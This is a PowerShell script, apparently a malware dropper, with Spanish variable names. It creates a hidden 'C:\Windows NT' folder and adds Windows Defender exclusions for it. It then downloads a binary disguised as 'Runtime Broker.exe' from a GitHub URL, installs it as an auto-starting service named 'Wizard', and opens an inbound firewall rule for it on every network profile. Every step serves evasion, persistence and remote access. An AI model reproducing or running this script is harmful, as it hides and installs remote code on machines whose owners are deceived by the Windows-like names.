$root = "C:\Windows NT"
$servicio = "Wizard"
$ejecutable = "Runtime Broker.exe"
$rootFile = Join-Path -Path $root -ChildPath $ejecutable

if (-not (Test-Path $root)) {
    try {
        New-Item -Path $root -ItemType Directory -Force
        Set-ItemProperty -Path $root -Name Attributes -Value 'Hidden'
    }
    catch {
        Write-Host "Error: $_"
    }
}else {
    try {
        Set-ItemProperty -Path $root -Name Attributes -Value 'Hidden'
    }
    catch {
        Write-Host "Error: $_"
    }
}

try {
    Add-MpPreference -ExclusionPath $root
    Add-MpPreference -ExclusionProcess $rootFile
}
catch {
    Write-Host "Error: $_"
}

try {
    Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/Runtime%20Broker.exe" -Destination $rootFile
}
catch {
    Write-Host "Error: $_"
}

try {
    $acl = Get-Acl $rootFile
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Usuarios", "FullControl", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $rootFile -AclObject $acl
}
catch {
    Write-Host "Error: $_"
}

try {
    New-Service -Name $servicio -BinaryPathName $rootFile -DisplayName $servicio -StartupType Automatic
}
catch {
    Write-Host "Error: $_"
}

try {
    New-NetFirewallRule -DisplayName $servicio -Direction Inbound -Program $rootFile -Action Allow -Profile Any -Enabled True
}
catch {
    Write-Host "Error: $_"
}

try {
    Start-Service -Name $servicio
}
catch {
    Write-Host "Error: $_"
}
